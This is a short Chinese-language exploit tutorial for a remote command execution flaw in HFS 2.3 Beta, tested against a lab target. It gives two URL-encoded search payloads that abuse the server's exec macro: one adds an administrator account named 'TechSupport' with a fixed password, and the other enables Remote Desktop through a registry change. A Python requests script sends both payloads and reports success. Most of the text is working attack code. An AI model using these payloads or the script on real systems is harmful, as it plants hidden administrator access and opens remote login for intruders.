一：实验环境

攻击者IP：192.168.31.20

靶机IP：192.168.31.244

攻击者环境：Python3 requests库

靶机环境：开启HFS~网络文件服务器 2.3Beta

二：攻击准备

  • 添加用户EXP：
/?search==%00%7B.exec%7Ccmd.exe%20/c%20net%20user%20TechSupport%20comeonbaby%20/add%20%26%20net%20localgroup%20administrators%20TechSupport%20/add.%7D
  • 开启3389EXP：
/?search==%00%7B.exec%7Ccmd.exe%20/c%20REG%20ADD%20HKLM%5CSYSTEM%5CCurrentControlSet%5CControl%5CTerminal%22%20%22Server%20/v%20fDenyTSConnections%20/t%20REG_DWORD%20/d%2000000000%20/f.%7D

三：脚本开发思路

  1. 接受输入的漏洞地址
  2. 组合漏洞地址并请求
  3. 判断漏洞是否利用成功
  4. 将利用成功的进行打印

四：漏洞利用脚本

import requests

url="http://192.168.31.244:8080/"

add_user="/?search==%00%7B.exec%7Ccmd.exe%20/c%20net%20user%20TechSupport%20comeonbaby%20/add%20%26%20net%20localgroup%20administrators%20TechSupport%20/add.%7D"
open_3389="/?search==%00%7B.exec%7Ccmd.exe%20/c%20REG%20ADD%20HKLM%5CSYSTEM%5CCurrentControlSet%5CControl%5CTerminal%22%20%22Server%20/v%20fDenyTSConnections%20/t%20REG_DWORD%20/d%2000000000%20/f.%7D"

url_adduser=url+add_user
url_open3389=url+open_3389

def adduser():
    code=requests.get(url_adduser).status_code
    if code==200:
        print("adduser success")
    else:
        print("adduser failed")

def open3389():
    code1=requests.get(url_open3389).status_code
    if code1==200:
        print("open3389 success")
    else:
        print("open3389 failed")

adduser()
open3389()
